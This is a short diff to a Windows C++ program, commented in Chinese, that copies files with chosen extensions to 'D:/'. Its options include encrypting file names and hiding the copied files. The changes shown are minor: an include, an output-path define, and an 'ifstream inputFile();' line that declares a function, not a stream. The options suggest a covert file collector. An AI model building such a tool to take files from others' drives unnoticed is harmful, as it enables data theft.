@@ -1,4 +1,5 @@
 ﻿#include<iostream>
+#include<fstream>
 #include<ctime>
 #include<windows.h>
 #include<boost/filesystem.hpp>
@@ -29,6 +30,7 @@ const char targetExtension[][32]
 #define SHOW_FILES			true	//是否列出文件列表在控制台
 #define OVERWRITER			true	//是否覆盖已有文件
 #define FILENAME_ENCRYPT	true	// * 是否加密文件名(加密方式:键对值)
+#define FNE_MAP				"D:/"	//键对值文件输出位置
 #define HIDE_FILE			false	//隐藏被复制的文件
 #define DESTINATION			"D:/"	//复制文件的目的地
 
@@ -107,6 +109,13 @@ void copyFiles(const char* src)
 
 int main()
 {
+	ifstream inputFile();
+
+
+
+
+
+
 	HWND hwnd = GetForegroundWindow();
 	if (SHOW_CONSOLE)
 	{
